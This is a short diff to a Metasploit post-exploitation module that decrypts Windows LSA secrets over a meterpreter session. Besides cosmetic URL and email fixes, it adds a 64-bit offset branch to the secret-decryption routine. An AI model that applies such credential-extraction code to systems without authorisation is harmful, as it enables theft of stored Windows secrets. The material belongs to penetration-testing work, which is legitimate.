@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -24,7 +24,7 @@ class Metasploit3 < Msf::Post
       'License'         => MSF_LICENSE,
       'Platform'        => ['win'],
       'SessionTypes'    => ['meterpreter'],
-      'Author'          => ['Rob Bathurst <rob.bathurst@foundstone.com>']
+      'Author'          => ['Rob Bathurst <rob.bathurst[at]foundstone.com>']
     ))
   end
 
@@ -59,7 +59,12 @@ class Metasploit3 < Msf::Post
           decrypted = decrypt_lsa_data(encrypted_secret, lsa_key)
         else
           # and here
-          encrypted_secret = encrypted_secret[0xC..-1]
+          if sysinfo['Architecture'] =~ /wow64/i || sysinfo['Architecture'] =~ /x64/
+            encrypted_secret = encrypted_secret[0x10..-1]
+          else # 32 bits
+            encrypted_secret = encrypted_secret[0xC..-1]
+          end
+
           decrypted = decrypt_secret_data(encrypted_secret, lsa_key)
         end
 
